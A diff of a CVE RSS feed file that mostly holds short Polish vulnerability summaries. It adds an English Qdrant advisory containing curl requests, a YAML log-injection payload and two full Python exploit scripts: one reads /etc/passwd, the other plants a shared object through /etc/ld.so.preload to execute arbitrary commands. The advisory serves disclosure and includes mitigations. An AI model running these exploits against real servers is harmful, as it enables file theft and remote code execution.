@@ -1,5 +1,281 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-0106</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0106</link><pubDate>Thu, 05 Feb 2026 20:19:20 +0000</pubDate><description>W vpu_mmap vpu_ioctl istnieje możliwość dowolnego adresu mmap z powodu sprawdzenia brakujących granic.Może to prowadzić do lokalnej eskalacji uprawnień bez konieczności posiadania dodatkowych uprawnień do wykonywania.Do wykorzystania nie jest wymagana interakcja użytkownika.</description></item><item><title>CVE-2026-1301</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1301</link><pubDate>Thu, 05 Feb 2026 19:09:37 +0000</pubDate><description>W kompilacjach z włączoną obsługą PubSub i JSON spreparowany komunikat JSON może spowodować, że dekoder zapisze poza tablicą przydzieloną stercie przed uwierzytelnieniem, co niezawodnie zawiesza proces i uszkadza pamięć.</description></item><item><title>CVE-2020-37148</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37148</link><pubDate>Thu, 05 Feb 2026 16:14:54 +0000</pubDate><description>P5 FNIP-8x16A/FNIP-4xSH w wersjach 1.0.20 i 1.0.11 zawiera lukę w zabezpieczeniach przechowywanych skryptów między witrynami.Dane wejściowe przekazywane do kilku parametrów GET/POST nie są odpowiednio oczyszczane przed zwróceniem użytkownikowi, co umożliwia atakującym wykonanie dowolnego kodu HTML i skryptu w sesji przeglądarki użytkownika w kontekście zaatakowanej witryny.Można to wykorzystać, przesyłając spreparowane dane wejściowe do funkcji modyfikacji etykiet, takie jak parametr „lab4” w pliku config.html.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-25628</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25628</link><pubDate>Thu, 05 Feb 2026 21:22:50 +0000</pubDate><description>### Summary
+It is possible to append to arbitrary files via /logger endpoint. Minimal privileges are required (read-only access). Tested on Qdrant 1.15.5
+
+### Details
+`POST /logger`
+([Source code link](https://github.com/qdrant/qdrant/blob/48203e414e4e7f639a6d394fb6e4df695f808e51/src/actix/api/service_api.rs#L195))
+endpoint accepts an attacker-controlled `on_disk.log_file` path.
+
+There are no authorization checks (but authentication check is present).
+
+This can be exploited in the following way: if configuration directory is writable and `config/local.yaml` does not exist, set log path to `config/local.yaml` and send a request with a log injection payload. The`PATCH /collections` endpoint was used with an invalid collection name to inject valid yaml.
+
+After running the PoC, the content of `config/local.yaml` will be:
+
+```yaml
+2025-11-11T23:52:22.054804Z  INFO actix_web::middleware::logger: 172.18.0.1 "POST /logger HTTP/1.1" 200 57 "-" "python-requests/2.32.5" 0.009422
+2025-11-11T23:52:22.056962Z  INFO storage::content_manager::toc::collection_meta_ops: Updating collection hui
+service:
+    static_content_dir: ..
+
+2025-11-11T23:52:22.057530Z  INFO actix_web::middleware::logger: 172.18.0.1 "PATCH /collections/hui%0Aservice:%0A%20%20static_content_dir:%20..%0A HTTP/1.1" 404 113 "-" "python-requests/2.32.5" 0.001391
+```
+
+Some junk log lines are present, but they don't matter as this is still valid yaml.
+
+After that, if qdrant is restarted (via legitimate means or by a OOM/crash), then `local.yaml` config will have higher priority and `service.static_content_dir` will be set to `..`. In a container environment, this allows one to read all files via the web UI path.
+
+Also overriding config file may let the attacker raise its privileges with a custom master key (remember that lowest privileges are required to access the vulnerable endpoint).
+
+Relevant requests:
+
+1. Enable on-disk logging to the config file:
+
+```bash
+curl -sS -X POST "http://localhost:6333/logger" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "log_level":"INFO",
+    "on_disk":{
+      "enabled":true,
+      "format":"text",
+      "log_level":"INFO",
+      "buffer_size_bytes":1,
+      "log_file":"config/local.yaml"
+    }
+  }'
+```
+
+2. Inject YAML via a request that logs newlines (URL-encoded):
+
+```bash
+curl -sS -X PATCH "http://localhost:6333/collections/hui%0aservice:%0a%20%20static_content_dir:%20..%0a" \
+  -H "Content-Type: application/json" \
+  -d '{}'
+```
+
+### Full reproduction instructions
+
+1. Start Qdrant with a writable configuration directory:
+
+```sh
+sudo docker run -p 6333:6333 --name qdrant-poc -d qdrant/qdrant:v1.15.5
+```
+
+2. Run the exploit:
+
+```sh
+% python3 exploit.py --url http://localhost:6333
+[+] Logger configured
+[+] Log injection successful
+[+] Logger disabled
+Restart Qdrant cluster and press Enter to continue...
+```
+
+3. Restart the container:
+
+```sh
+sudo docker restart qdrant-poc
+```
+
+4. Resume the exploit:
+
+```sh
+&lt;press Enter&gt;
+[+] Passwd file retrieved
+--------------------------------
+...
+--------------------------------
+[+] Config file retrieved
+--------------------------------
+...
+```
+
+## Mitigation
+
+1. Limit usage of `/logger` endpoint to users with management privileges only (or better disable it completely).
+2. Restrict the path of the log file to a dedicated logs directory.
+
+This vulnerability does not affect Qdrant cloud as the configuration directory is not writable.
+
+## Exploit code
+
+### `exploit_privesc.py`
+
+```python
+import requests
+import sys
+import argparse
+
+parser = argparse.ArgumentParser(description="Exploit script for posting to Qdrant API")
+parser.add_argument("--url", required=False, help="Target URL for API", default="http://localhost:6333")
+parser.add_argument("--api-key", required=False, help="API key")
+
+args = parser.parse_args()
+
+url = args.url
+
+headers = {}
+if args.api_key:
+    headers["api-key"] = args.api_key
+
+s = requests.Session()
+
+s.headers.update(headers)
+
+res = s.post(
+    f"{url}/logger",
+    json={
+        "log_level": "INFO",
+        "on_disk": {
+            "enabled": True,
+            "format": "text",
+            "log_level": "INFO",
+            "buffer_size_bytes": 1,
+            "log_file": "config/local.yaml",
+        },
+    },
+)
+res.raise_for_status()
+print("[+] Logger configured")
+
+
+res = s.patch(
+    f"{url}/collections/%0aservice:%0a%20%20static_content_dir:%20..%0a",
+    json={},
+)
+error = res.json()["status"]["error"]
+
+if "doesn't exist!" in error:
+    print("[+] Log injection successful")
+else:
+    print(f"[-] Error: {error}")
+    sys.exit(1)
+
+res = s.post(
+    f"{url}/logger",
+    json={
+        "on_disk": {
+            "enabled": False,
+        },
+    },
+)
+res.raise_for_status()
+print("[+] Logger disabled")
+
+input("Restart Qdrant cluster and press Enter to continue...")
+
+res = s.get(f"{url}/dashboard/etc/passwd")
+res.raise_for_status()
+print("[+] Passwd file retrieved")
+print("--------------------------------")
+print(res.text)
+print("--------------------------------")
+
+res = s.get(f"{url}/dashboard/qdrant/config/config.yaml")
+res.raise_for_status()
+print("[+] Config file retrieved")
+print("--------------------------------")
+print(res.text)
+print("--------------------------------")
+```
+
+## `exploit_rce.py`
+
+```python
+import requests
+import argparse
+import tempfile
+import os
+
+TEST_COLLECTION_NAME = "COLTEST"
+
+
+parser = argparse.ArgumentParser(description="Exploit script for posting to Qdrant API")
+parser.add_argument("--url", required=False, help="Target URL for API", default="http://localhost:6333")
+parser.add_argument("--api-key", required=False, help="API key")
+parser.add_argument("--cmd", default="touch /tmp/touched_by_rce")
+parser.add_argument("--lib", default="")
+
+args = parser.parse_args()
+
+
+assert "'" not in args.cmd, "Command must not contain single quotes"
+so_code = """
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+__attribute__((constructor))
+void init() {
+    unlink("/etc/ld.so.preload");
+    system("/bin/bash -c 'XXXXXXXX'");
+}
+""".replace('XXXXXXXX', args.cmd)
+
+with tempfile.TemporaryDirectory() as tmpdir:
+    with open(f"{tmpdir}/cmd_code.c", "w") as f:
+        f.write(so_code)
+    os.system(f'gcc -shared -fPIC -o {tmpdir}/cmd.so {tmpdir}/cmd_code.c')
+    cmd_so = open(f'{tmpdir}/cmd.so', "rb").read()
+
+url = args.url
+
+headers = {}
+if args.api_key:
+    headers["api-key"] = args.api_key
+
+s = requests.Session()
+
+s.headers.update(headers)
+
+res = s.post(
+    f"{url}/logger",
+    json={
+        "log_level": "INFO",
+        "on_disk": {
+            "enabled": True,
+            "format": "text",
+            "log_level": "INFO",
+            "buffer_size_bytes": 1,
+            "log_file": "/etc/ld.so.preload",
+        },
+    },
+)
+res.raise_for_status()
+print("[+] Logger configured")
+
+res = s.get(
+    f"{url}/:/qdrant/snapshots/{TEST_COLLECTION_NAME}/hui.so",
+)
+
+print("[+] Log injected")
+
+
+res = s.post(
+    f"{url}/logger",
+    json={
+        "on_disk": {
+            "enabled": False,
+        },
+    },
+)
+res.raise_for_status()
+print("[+] Logger disabled")
+
+
+rsp = s.post(f"{args.url}/collections/{TEST_COLLECTION_NAME}/snapshots/upload", files={"snapshot": ("hui.so", cmd_so, "application/octet-stream")})
+
+print(rsp.text)
+# trigger the stacktace endpoint which will run execute `/qdrant/qdrant --stacktrace`
+
+input("Press Enter to continue...")
+rsp = s.get(f"{args.url}/stacktrace")
+rsp.raise_for_status()
+```
+
+### Impact
+Remote code execution.</description></item><item><title>CVE-2026-0106</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0106</link><pubDate>Thu, 05 Feb 2026 20:19:20 +0000</pubDate><description>W vpu_mmap vpu_ioctl istnieje możliwość dowolnego adresu mmap z powodu sprawdzenia brakujących granic.Może to prowadzić do lokalnej eskalacji uprawnień bez konieczności posiadania dodatkowych uprawnień do wykonywania.Do wykorzystania nie jest wymagana interakcja użytkownika.</description></item><item><title>CVE-2026-1301</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1301</link><pubDate>Thu, 05 Feb 2026 19:09:37 +0000</pubDate><description>W kompilacjach z włączoną obsługą PubSub i JSON spreparowany komunikat JSON może spowodować, że dekoder zapisze poza tablicą przydzieloną stercie przed uwierzytelnieniem, co niezawodnie zawiesza proces i uszkadza pamięć.</description></item><item><title>CVE-2020-37148</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37148</link><pubDate>Thu, 05 Feb 2026 16:14:54 +0000</pubDate><description>P5 FNIP-8x16A/FNIP-4xSH w wersjach 1.0.20 i 1.0.11 zawiera lukę w zabezpieczeniach przechowywanych skryptów między witrynami.Dane wejściowe przekazywane do kilku parametrów GET/POST nie są odpowiednio oczyszczane przed zwróceniem użytkownikowi, co umożliwia atakującym wykonanie dowolnego kodu HTML i skryptu w sesji przeglądarki użytkownika w kontekście zaatakowanej witryny.Można to wykorzystać, przesyłając spreparowane dane wejściowe do funkcji modyfikacji etykiet, takie jak parametr „lab4” w pliku config.html.
 
 CVSS Score: 3.5 (low)</description></item><item><title>CVE-2020-37152</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37152</link><pubDate>Thu, 05 Feb 2026 16:13:42 +0000</pubDate><description>PHP-Fusion 9.03.50 panels.php jest podatny na ataki typu cross-site scripting (XSS) poprzez parametr POST „panel_content”.Aplikacja nie oczyszcza prawidłowo danych wejściowych użytkownika przed wyświetleniem ich w przeglądarce, co umożliwia atakującym wstrzyknięcie dowolnego kodu JavaScript.Można to wykorzystać, przesyłając spreparowane dane wejściowe do pola „panel_content” w panels.php, co skutkuje wykonaniem złośliwych skryptów w kontekście zainfekowanej witryny.</description></item><item><title>CVE-2020-37150</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37150</link><pubDate>Thu, 05 Feb 2026 16:13:42 +0000</pubDate><description>Edimax EW-7438RPn-v3 Mini 1.27 umożliwia nieuwierzytelnionym atakującym dostęp do strony /wizard_reboot.asp w trybie unsetup, który ujawnia identyfikator SSID Wi-Fi i klucz bezpieczeństwa.Osoby atakujące mogą odzyskać hasło sieci bezprzewodowej, wysyłając żądanie GET do tego punktu końcowego, ujawniając poufne informacje bez uwierzytelnienia.
 
@@ -21,7 +297,19 @@ CVSS Score: 8.4 (high)</description></item><item><title>CVE-2020-37138</title><l
 
 CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2020-37137</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37137</link><pubDate>Thu, 05 Feb 2026 16:13:37 +0000</pubDate><description>PHP-Fusion 9.03.50 zawiera lukę w zabezpieczeniach umożliwiającą zdalne wykonanie kodu w funkcji „add_panel_form()”, która umożliwia atakującym wykonanie dowolnego kodu za pomocą funkcji eval() z niezakażonymi danymi POST.Osoby atakujące mogą wykorzystać tę lukę, wysyłając spreparowane parametry POST panelu_content do punktu końcowego administracyjnego panel_content w celu wykonania złośliwego kodu.
 
-CVSS Score: 6.1 (medium)</description></item><item><title>CVE-2026-23572</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23572</link><pubDate>Thu, 05 Feb 2026 12:30:26 +0000</pubDate><description>Niewłaściwa kontrola dostępu w klientach TeamViewer Full i Host (Windows, macOS, Linux) przed wersją 15.74.5 umożliwia uwierzytelnionemu użytkownikowi ominięcie dodatkowych kontroli dostępu za pomocą konfiguracji „Zezwalaj po potwierdzeniu” w sesji zdalnej.Exploit może skutkować nieautoryzowanym dostępem przed lokalnym potwierdzeniem.Aby wykorzystać tę lukę, użytkownik musi zostać uwierzytelniony na potrzeby sesji zdalnej za pomocą identyfikatora/hasła, łącza sesji lub funkcji Easy Access.</description></item><item><title>CVE-2026-1966</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1966</link><pubDate>Thu, 05 Feb 2026 12:30:26 +0000</pubDate><description>YugabyteDB Anywhere wyświetla hasła powiązań LDAP skonfigurowane za pomocą flag gflag w postaci zwykłego tekstu w interfejsie internetowym.Uwierzytelniony użytkownik mający dostęp do widoku konfiguracji może uzyskać poświadczenia LDAP, potencjalnie umożliwiając nieautoryzowany dostęp do zewnętrznych usług katalogowych.</description></item><item><title>CVE-2026-1654</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1654</link><pubDate>Thu, 05 Feb 2026 12:30:25 +0000</pubDate><description>Wtyczka Peter's Date Countdown do WordPressa jest podatna na Reflected Cross-Site Scripting poprzez parametr `$_SERVER['PHP_SELF']` we wszystkich wersjach aż do 2.0.0 włącznie z powodu niewystarczającej sanityzacji danych wejściowych i ucieczki danych wyjściowych.Umożliwia to nieuwierzytelnionym atakującym wstrzyknięcie dowolnych skryptów internetowych na strony, które zostaną wykonane, jeśli uda im się skutecznie nakłonić użytkownika do wykonania czynności, takiej jak kliknięcie łącza.</description></item><item><title>CVE-2025-14079</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14079</link><pubDate>Thu, 05 Feb 2026 12:30:25 +0000</pubDate><description>Wtyczka ELEX WordPress HelpDesk i Customer Ticketing System dla WordPress jest podatna na brakującą autoryzację we wszystkich wersjach do 3.3.5 włącznie.Dzieje się tak z powodu braku kontroli możliwości funkcji eh_crm_ticket_general w połączeniu ze współdzieloną wartością jednorazową dostępną dla użytkowników o niskich uprawnieniach.Dzięki temu uwierzytelnieni atakujący z dostępem na poziomie subskrybenta i wyższym mogą modyfikować globalne ustawienia WSDesk za pomocą akcji AJAX `eh_crm_ticket_general`.</description></item><item><title>CVE-2026-1271</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1271</link><pubDate>Thu, 05 Feb 2026 12:30:25 +0000</pubDate><description>Wtyczka ProfileGrid — profile użytkowników, grupy i społeczności dla WordPressa jest podatna na ataki Insecure Direct Object Reference we wszystkich wersjach, aż do wersji 5.9.7.2 włącznie, za pośrednictwem akcji AJAX „pm_upload_image” i „pm_upload_cover_image”.Dzieje się tak dlatego, że funkcja update_user_meta() jest wywoływana poza sprawdzaniem autoryzacji użytkownika w plikach public/partials/crop.php i public/partials/coverimg_crop.php.Dzięki temu uwierzytelnieni atakujący z dostępem na poziomie subskrybenta i wyższym mogą zmienić zdjęcie profilowe lub zdjęcie na okładkę dowolnego użytkownika, w tym administratorów.</description></item><item><title>CVE-2026-1294</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1294</link><pubDate>Thu, 05 Feb 2026 12:30:25 +0000</pubDate><description>Wtyczka All In One Image Viewer Block dla WordPressa jest podatna na fałszerstwo żądań po stronie serwera we wszystkich wersjach aż do 1.0.2 włącznie z powodu braku autoryzacji i sprawdzania poprawności adresu URL w punkcie końcowym API REST proxy obrazu.Umożliwia to nieuwierzytelnionym atakującym wysyłanie żądań internetowych do dowolnych lokalizacji pochodzących z aplikacji internetowej i może być wykorzystywane do wysyłania zapytań i modyfikowania informacji z usług wewnętrznych.</description></item><item><title>CVE-2026-1517</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1517</link><pubDate>Thu, 05 Feb 2026 12:02:06 +0000</pubDate><description>W iomad do wersji 5.0 została zidentyfikowana podatność.Dotknięta jest nieznana funkcja w komponencie Company Admin Block.Taka manipulacja prowadzi do wstrzyknięcia sql.Atak może zostać przeprowadzony zdalnie.Aktualizacja do wersji 4.5 LTS i 5.0 rozwiązuje ten problem.Należy zaktualizować komponent, którego dotyczy problem.
+CVSS Score: 6.1 (medium)</description></item><item><title>CVE-2020-37130</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37130</link><pubDate>Thu, 05 Feb 2026 16:13:35 +0000</pubDate><description>Nsauditor 3.2.0.0 zawiera lukę umożliwiającą odmowę usługi w polu wprowadzania nazwy rejestracyjnej, która umożliwia atakującym zawieszenie aplikacji.Osoby atakujące mogą utworzyć szkodliwy ładunek składający się z 1000 bajtów składających się z powtarzających się znaków, aby po wklejeniu go w polu nazwy rejestracyjnej wywołać awarię aplikacji.
+
+CVSS Score: 7.5 (high)</description></item><item><title>CVE-2020-37129</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37129</link><pubDate>Thu, 05 Feb 2026 16:13:34 +0000</pubDate><description>Memu Play 7.1.3 zawiera lukę w zabezpieczeniach niebezpiecznych folderów, która umożliwia użytkownikom o niskich uprawnieniach modyfikowanie pliku wykonywalnego MemuService.exe.Osoby atakujące mogą podczas ponownego uruchamiania systemu zastąpić plik wykonywalny usługi złośliwym plikiem, aby uzyskać uprawnienia na poziomie SYSTEMU, wykorzystując nieograniczone uprawnienia do modyfikacji plików.
+
+CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2020-37128</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37128</link><pubDate>Thu, 05 Feb 2026 16:13:34 +0000</pubDate><description>ZOC Terminal 7.25.5 zawiera lukę w przetwarzaniu skryptów, która umożliwia lokalnym atakującym awarię aplikacji poprzez załadowanie złośliwie spreparowanego pliku skryptu REXX.Osoby atakujące mogą wygenerować zbyt duży skrypt zawierający 20 000 powtarzających się znaków, aby wywołać awarię aplikacji i spowodować odmowę usługi.
+
+CVSS Score: 6.2 (medium)</description></item><item><title>CVE-2020-37127</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37127</link><pubDate>Thu, 05 Feb 2026 16:13:33 +0000</pubDate><description>Dnsmasq-utils 2.79-1 zawiera lukę w zabezpieczeniach związaną z przepełnieniem bufora w narzędziu dhcp_release, która umożliwia atakującym spowodowanie odmowy usługi poprzez podanie nadmiernych danych wejściowych.Atakujący mogą wywołać zrzut pamięci i zakończyć proces dhcp_release, wysyłając spreparowany ciąg wejściowy dłuższy niż 16 znaków.
+
+CVSS Score: 5.5 (medium)</description></item><item><title>CVE-2020-37126</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37126</link><pubDate>Thu, 05 Feb 2026 16:13:33 +0000</pubDate><description>Free Desktop Clock 3.0 zawiera lukę w zabezpieczeniach związaną z przepełnieniem stosu w obszarze wyświetlania nazwy strefy czasowej, która umożliwia atakującym nadpisanie rejestrów obsługi wyjątków strukturalnych (SEH).Osoby atakujące mogą wykorzystać tę lukę, tworząc złośliwe dane wejściowe Unicode, które powodują naruszenie zasad dostępu i potencjalnie wykonują dowolny kod.
+
+CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2020-37125</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37125</link><pubDate>Thu, 05 Feb 2026 16:13:32 +0000</pubDate><description>Edimax EW-7438RPn-v3 Mini 1.27 zawiera lukę umożliwiającą zdalne wykonanie kodu, która umożliwia nieuwierzytelnionym atakującym wykonywanie dowolnych poleceń za pośrednictwem punktu końcowego /goform/mp.Osoby atakujące mogą wykorzystać tę lukę, wysyłając spreparowane żądania POST z ładunkami wstrzykiwania poleceń w celu pobrania i wykonania złośliwych skryptów na urządzeniu.
+
+CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2026-23572</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23572</link><pubDate>Thu, 05 Feb 2026 12:30:26 +0000</pubDate><description>Niewłaściwa kontrola dostępu w klientach TeamViewer Full i Host (Windows, macOS, Linux) przed wersją 15.74.5 umożliwia uwierzytelnionemu użytkownikowi ominięcie dodatkowych kontroli dostępu za pomocą konfiguracji „Zezwalaj po potwierdzeniu” w sesji zdalnej.Exploit może skutkować nieautoryzowanym dostępem przed lokalnym potwierdzeniem.Aby wykorzystać tę lukę, użytkownik musi zostać uwierzytelniony na potrzeby sesji zdalnej za pomocą identyfikatora/hasła, łącza sesji lub funkcji Easy Access.</description></item><item><title>CVE-2026-1966</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1966</link><pubDate>Thu, 05 Feb 2026 12:30:26 +0000</pubDate><description>YugabyteDB Anywhere wyświetla hasła powiązań LDAP skonfigurowane za pomocą flag gflag w postaci zwykłego tekstu w interfejsie internetowym.Uwierzytelniony użytkownik mający dostęp do widoku konfiguracji może uzyskać poświadczenia LDAP, potencjalnie umożliwiając nieautoryzowany dostęp do zewnętrznych usług katalogowych.</description></item><item><title>CVE-2026-1654</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1654</link><pubDate>Thu, 05 Feb 2026 12:30:25 +0000</pubDate><description>Wtyczka Peter's Date Countdown do WordPressa jest podatna na Reflected Cross-Site Scripting poprzez parametr `$_SERVER['PHP_SELF']` we wszystkich wersjach aż do 2.0.0 włącznie z powodu niewystarczającej sanityzacji danych wejściowych i ucieczki danych wyjściowych.Umożliwia to nieuwierzytelnionym atakującym wstrzyknięcie dowolnych skryptów internetowych na strony, które zostaną wykonane, jeśli uda im się skutecznie nakłonić użytkownika do wykonania czynności, takiej jak kliknięcie łącza.</description></item><item><title>CVE-2025-14079</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14079</link><pubDate>Thu, 05 Feb 2026 12:30:25 +0000</pubDate><description>Wtyczka ELEX WordPress HelpDesk i Customer Ticketing System dla WordPress jest podatna na brakującą autoryzację we wszystkich wersjach do 3.3.5 włącznie.Dzieje się tak z powodu braku kontroli możliwości funkcji eh_crm_ticket_general w połączeniu ze współdzieloną wartością jednorazową dostępną dla użytkowników o niskich uprawnieniach.Dzięki temu uwierzytelnieni atakujący z dostępem na poziomie subskrybenta i wyższym mogą modyfikować globalne ustawienia WSDesk za pomocą akcji AJAX `eh_crm_ticket_general`.</description></item><item><title>CVE-2026-1271</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1271</link><pubDate>Thu, 05 Feb 2026 12:30:25 +0000</pubDate><description>Wtyczka ProfileGrid — profile użytkowników, grupy i społeczności dla WordPressa jest podatna na ataki Insecure Direct Object Reference we wszystkich wersjach, aż do wersji 5.9.7.2 włącznie, za pośrednictwem akcji AJAX „pm_upload_image” i „pm_upload_cover_image”.Dzieje się tak dlatego, że funkcja update_user_meta() jest wywoływana poza sprawdzaniem autoryzacji użytkownika w plikach public/partials/crop.php i public/partials/coverimg_crop.php.Dzięki temu uwierzytelnieni atakujący z dostępem na poziomie subskrybenta i wyższym mogą zmienić zdjęcie profilowe lub zdjęcie na okładkę dowolnego użytkownika, w tym administratorów.</description></item><item><title>CVE-2026-1294</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1294</link><pubDate>Thu, 05 Feb 2026 12:30:25 +0000</pubDate><description>Wtyczka All In One Image Viewer Block dla WordPressa jest podatna na fałszerstwo żądań po stronie serwera we wszystkich wersjach aż do 1.0.2 włącznie z powodu braku autoryzacji i sprawdzania poprawności adresu URL w punkcie końcowym API REST proxy obrazu.Umożliwia to nieuwierzytelnionym atakującym wysyłanie żądań internetowych do dowolnych lokalizacji pochodzących z aplikacji internetowej i może być wykorzystywane do wysyłania zapytań i modyfikowania informacji z usług wewnętrznych.</description></item><item><title>CVE-2026-1517</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1517</link><pubDate>Thu, 05 Feb 2026 12:02:06 +0000</pubDate><description>W iomad do wersji 5.0 została zidentyfikowana podatność.Dotknięta jest nieznana funkcja w komponencie Company Admin Block.Taka manipulacja prowadzi do wstrzyknięcia sql.Atak może zostać przeprowadzony zdalnie.Aktualizacja do wersji 4.5 LTS i 5.0 rozwiązuje ten problem.Należy zaktualizować komponent, którego dotyczy problem.
 
 CVSS Score: 4.7 (medium)</description></item><item><title>CVE-2026-23572</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23572</link><pubDate>Thu, 05 Feb 2026 11:51:20 +0000</pubDate><description>Niewłaściwa kontrola dostępu w klientach TeamViewer Full i Host (Windows, macOS, Linux) przed wersją 15.74.5 umożliwia uwierzytelnionemu użytkownikowi ominięcie dodatkowych kontroli dostępu za pomocą konfiguracji „Zezwalaj po potwierdzeniu” w sesji zdalnej.Exploit może skutkować nieautoryzowanym dostępem przed lokalnym potwierdzeniem.Aby wykorzystać tę lukę, użytkownik musi zostać uwierzytelniony na potrzeby sesji zdalnej za pomocą identyfikatora/hasła, łącza sesji lub funkcji Easy Access.
 
@@ -1225,7 +1513,7 @@ CVSS Score: 5.3 (medium)</description></item><item><title>CVE-2026-1819</title><
 
 CVSS Score: 8.8 (high)</description></item><item><title>CVE-2026-1756</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1756</link><pubDate>Wed, 04 Feb 2026 06:42:37 +0000</pubDate><description>Wtyczka WP FOFT Loader dla WordPressa jest podatna na dowolne przesyłanie plików z powodu nieprawidłowej weryfikacji typu pliku w funkcji „WP_FOFT_Loader_Mimes::file_and_ext” we wszystkich wersjach do 2.1.39 włącznie.Dzięki temu uwierzytelnieni atakujący z dostępem na poziomie autora lub wyższym mogą przesłać dowolne pliki na serwer zainfekowanej witryny, co może umożliwić zdalne wykonanie kodu.
 
-CVSS Score: 8.8 (high)</description></item><item><title>CVE-2026-1791</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1791</link><pubDate>Wed, 04 Feb 2026 06:31:20 +0000</pubDate><description>Nieograniczone przesyłanie plików z luką w zabezpieczeniach typu niebezpiecznego w Hillstone Networks Operation and Maintenance Security Gateway w systemie Linux umożliwia przesłanie powłoki internetowej na serwer internetowy. Ten problem dotyczy obsługi i konserwacji Security Gateway: V5.5ST00001B113.</description></item><item><title>CVE-2025-29867</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-29867</link><pubDate>Wed, 04 Feb 2026 06:31:20 +0000</pubDate><description>Dostęp do zasobów przy użyciu luki w zabezpieczeniach niezgodnego typu („pomieszanie typów”) w Hancom Inc. Hancom Office 2018, Hancom Inc. Hancom Office 2020, Hancom Inc. Hancom Office 2022, Hancom Inc. Hancom Office 2024 umożliwia wstrzykiwanie zawartości pliku. Ten problem dotyczy Hancom Office 2018: przed wersją 10.0.0.12681;Hancom Office 2020: przed 11.0.0.8916;Hancom Office 2022: przed 12.0.0.4426;Hancom Office 2024: przed 13.0.0.3050.</description></item><item><title>CVE-2026-20987</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20987</link><pubDate>Wed, 04 Feb 2026 06:14:50 +0000</pubDate><description>Niewłaściwa weryfikacja danych wejściowych w GalaxyDiagnostics przed wersją 3.5.050 umożliwia lokalnym uprzywilejowanym atakującym wykonywanie uprzywilejowanych poleceń.</description></item><item><title>CVE-2026-20986</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20986</link><pubDate>Wed, 04 Feb 2026 06:14:49 +0000</pubDate><description>Przechodzenie ścieżki w urządzeniach Samsung Members wcześniejszych niż chińska wersja 15.5.05.4 umożliwia lokalnym atakującym nadpisanie danych w ramach Samsung Members.</description></item><item><title>CVE-2026-20985</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20985</link><pubDate>Wed, 04 Feb 2026 06:14:48 +0000</pubDate><description>Nieprawidłowa weryfikacja danych wejściowych w programie Samsung Members przed wersją 5.6.00.11 umożliwia zdalnym atakującym połączenie dowolnego adresu URL i uruchomienie dowolnej aktywności z uprawnieniami Samsung Members.Do wyzwolenia tej luki wymagana jest interakcja użytkownika.</description></item><item><title>CVE-2026-20984</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20984</link><pubDate>Wed, 04 Feb 2026 06:14:47 +0000</pubDate><description>Niewłaściwa obsługa niewystarczających uprawnień w Galaxy Wearable zainstalowanym na urządzeniu innej firmy niż Samsung przed wersją 2.2.68 umożliwia lokalnym atakującym dostęp do poufnych informacji.</description></item><item><title>CVE-2026-20983</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-20983</link><pubDate>Wed, 04 Feb 2026 06:14:45 +0000</pubDate><description>Niewłaściwy eksport komponentów aplikacji dla Androida w Samsung Dialer przed wersją 1 SMR z lutego 2026 r. umożliwia lokalnym atakującym uruchomienie dowolnej aktywności z uprawnieniami Samsung Dialer.</description></item><item><title>CVE-2020-37094</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37094</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>EspoCRM 5.8.5 zawiera lukę w uwierzytelnianiu, która umożliwia atakującym dostęp do kont innych użytkowników poprzez manipulację nagłówkami autoryzacyjnymi.Osoby atakujące mogą dekodować i modyfikować tokeny autoryzacji podstawowej i autoryzacji Espo, aby uzyskać nieautoryzowany dostęp do informacji i przywilejów użytkowników administracyjnych.</description></item><item><title>CVE-2020-37082</title><link>https://nvd.nist.gov/vuln/detail/CVE-2020-37082</link><pubDate>Wed, 04 Feb 2026 00:30:29 +0000</pubDate><description>webERP 4.15.1 zawiera lukę w zabezpieczeniach umożliwiającą 